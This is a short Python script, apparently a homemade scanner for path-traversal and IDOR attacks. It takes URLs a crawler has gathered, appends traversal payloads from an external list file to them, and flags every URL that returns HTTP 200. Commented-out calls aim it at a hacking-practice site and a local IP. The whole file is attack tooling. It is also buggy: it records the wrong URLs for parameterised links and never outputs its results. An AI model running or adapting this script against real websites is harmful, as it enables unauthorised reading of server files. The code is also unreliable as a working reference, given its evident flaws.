from general import *
import re
import requests

class mainIdor:

    def __init__(self, url, prname):
        self.url = url
        self.prname = prname
        self.urlParm = list()

        self.listUrl = file_to_set(prname + "/crawled.txt")
        self.boot()

    def boot(self):
        #print(self.listUrl)
        for url in self.listUrl:
            cek = cek_link_with_parm(url)
            if cek is True:
                self.urlParm.append(url)
        self.traversal_attack(self.url)


    def traversal_attack(self, url):
        linkBerhasil = list()
        list_attack = file_to_set("list_PaTrav_attack.txt")
        for a in list_attack:
            cek = self.cek_link(url + a)
            print("response " + str(cek) + " : " + url + a)
            if cek == 200:
                linkBerhasil.append(url + a)

        #extended traversal path attack
        if len(self.urlParm) == 0:
            print("list don't have url with parameter")
        for link in self.urlParm:
            split = re.split("([^\?]+)(\?.*=)", link)
            for a in list_attack:
               cek = self.cek_link(split[1] + a)
               if cek == 200:
                   linkBerhasil.append(url + a)
            for a in list_attack:
                cek = self.cek_link(split[1] + split[2] + a)
                if cek == 200:
                    linkBerhasil.append(url + a)

    def cek_link(self, link):
        try:
            response = requests.get(link)
            code = response.status_code
            return code
        except Exception as e:
            return 404

#traversal_attack("http://testsite.com/get.php?f=list$g=coba")
#mainIdor('https://www.hackthissite.org', 'hack')
#mainIdor(' http://192.168.10.7', 'test')